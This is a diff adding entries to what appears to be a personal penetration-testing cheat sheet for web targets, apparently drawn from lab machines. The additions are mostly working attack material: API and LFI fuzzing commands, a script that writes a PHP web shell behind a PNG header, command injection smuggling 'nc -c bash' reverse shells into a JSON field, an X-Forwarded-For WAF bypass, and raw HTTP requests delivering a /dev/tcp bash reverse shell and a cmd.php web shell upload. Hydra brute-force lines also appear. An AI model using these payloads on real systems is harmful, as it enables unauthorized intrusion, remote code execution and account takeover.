@@ -23,6 +23,16 @@ gobuster dir -u http://$ip:5002 -w /opt/SecLists/Discovery/Web-Content/combined_
 # Once you have the hostname, search for vhost
 feroxbuster -k -u https://streamio.htb -x php -o streamio.htb.feroxbuster -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
 [Enter] -> c -f {number of search to cancel}
+
+# Fuzzing APIs
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/objects.txt --hc 404 $url/FUZZ
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-endpoints-res.txt --hc 404 $url/FUZZ
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt --hc 404 $url/FUZZ
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_words.txt --hc 404 $url/FUZZ
+ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/lil-fuzz.txt
+ffuf -k -u $url/api/FUZZ -w ~/repos/offsec/lists/sqli.txt
+curl -X POST -H 'Content-Type: application/json' --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/update
+curl -si --data '{"user": "admin", "url", "http://192.168.45.178/update"}' http://192.168.193.134:13337/updat
 ```
 4. Nikto
 ```bash
@@ -212,6 +222,12 @@ You can upload as cmd.jpg then intercept and switch to cmd.jpg.php.
 
 - Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
 
+```bash
+#!/bin/sh
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
+echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
+```
+
 - Try changing the Content-Type header in Burp to something that you know it accepts, such as s image/jpeg, image/gif, image/png.
 
 - See if you can intercept and modify the files, naming the php file shell.txt initially, then changing it to shell.php.
@@ -370,6 +386,21 @@ curl -si --data "code=1+1" # {7*7}...
 curl http://192.168.195.117:50000/verify -si --data "code=os.system('nc -c bash 192.168.45.178 50000')"
 ```
 
+#### Retrieve cookie, response headers
+
+```bash
+curl -I http://$ip/filemanager/ # (retrieves a fresh cookie)
+```
+
+#### WAF Access Denied
+
+Try adding X-Forwarded-For to gain some trust.
+
+```bash
+curl -H 'X-Forwarded-For: localhost' http://192.168.193.134:13337/logs
+wfuzz -c -z file,/home/kali/repos/offsec/lists/lfi.txt --hc 404,500 -H 'X-Forwarded-For: localhost' 'http://192.168.193.134:13337/logs?file=FUZZ'
+curl -X POST -H 'X-Forwarded-For: localhost' -H 'Content-Type: application/json' --data '{"user":"clumsyadmin", "url":";nc -c bash 192.168.45.178 443"}' 'http://192.168.193.134:13337/update'
+```
 #### Fuzzing Input Paramater
 
 Find the parameter in Burp to what you want to FUZZ, as well as the Content-Type in Request Headers.
@@ -391,3 +422,65 @@ hydra -l user -P pwdpath ip http-get
 ```bash
 hydra -L user.txt -P pass.txt 10.10.123.83 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
 ```
+
+#### Finding Root Directory
+
+Refer to 'https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery/predictable-filepaths/webservers-appservers' for application specific seen locations.
+
+
+Example post request.
+
+````
+POST /serverinfo HTTP/1.1
+Host: 192.168.214.114:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://192.168.214.114:8080/serverinfo
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 185
+Origin: http://192.168.214.114:8080
+Connection: close
+Cookie: _forum_on_rails_session=XuJdkOzvkY%2FGvsLTdPUryTm0axW3Bd%2FAVmJACm26u3uZGWKZnGpK4wqlObwLM0XbSDTaylpMHj%2F4T7RWss%2FqRkviuuKxX%2FIWjd1%2BNrsW5K6iPVZZxVfHAYsilSAytzTY5Ri0jaF4FQeYMQ1Tt7NH3UMs57dpyYqrwnGIFSuOueWgLLuKLZYlNXUazlGgSYUut9il%2BVa5BYOeC2LNrJR2IHvSDdMuAuTyik1%2BYmuM7oJ2ylQOE2rz0Qpl2YmRvd8azD%2Frm6LvZnwqMT7GgpcCpZGUVkbUlEEenah9YvLUC7eGFudR21A0KZGs7AcJs4HLzLezy5qpNS%2FwwUChwgrqTyWSE8ggV6E8ksjfw9tQZZCHPi1wwfoLYuasX%2Bos%2FrJfhxDOYx9fhH1m7Ock5KTt--bD0GYoMPTFK2RvBc--fNbrpxQT53InzNaJdcdDRQ%3D%3D
+Upgrade-Insecure-Requests: 1
+
+authenticity_token=U%2FJaPjmyotmZ3naPc7Iw%2B5FwSGBkFmr6DlMTJqWmE9a7AX1%2B7HKngOYcEehoo%2F4Xo3NDkGa%2FJK2OzVFYTcpMxA%3D%3D&cmd=bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.178%2F443+0%3E%261
+````
+
+````
+POST /db/?clickhouse=localhost&username=admin&db=evil&import= HTTP/1.1
+Host: 192.168.193.109
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://192.168.193.109/db/?clickhouse=localhost&username=admin&db=evil&import=
+Content-Type: multipart/form-data; boundary=---------------------------399488293235751044031263878276
+Content-Length: 623
+Origin: http://192.168.193.109
+Connection: close
+Cookie: adminer_permanent=; adminer_settings=defaults%3D1; adminer_engine=MergeTree; adminer_sid=u78erfhdgia68p3qiul0bicsgn; adminer_key=d146d6a494537a572ef3222fec668a40; adminer_version=4.8.1
+Upgrade-Insecure-Requests: 1
+
+-----------------------------399488293235751044031263878276
+Content-Disposition: form-data; name="sql_file[]"; filename="cmd.php"
+Content-Type: application/x-php
+
+<?php system($_GET['cmd']); ?>
+
+-----------------------------399488293235751044031263878276
+Content-Disposition: form-data; name="error_stops"
+
+1
+-----------------------------399488293235751044031263878276
+Content-Disposition: form-data; name="only_errors"
+
+1
+-----------------------------399488293235751044031263878276
+Content-Disposition: form-data; name="token"
+
+738807:409982
+-----------------------------399488293235751044031263878276--
+
+````
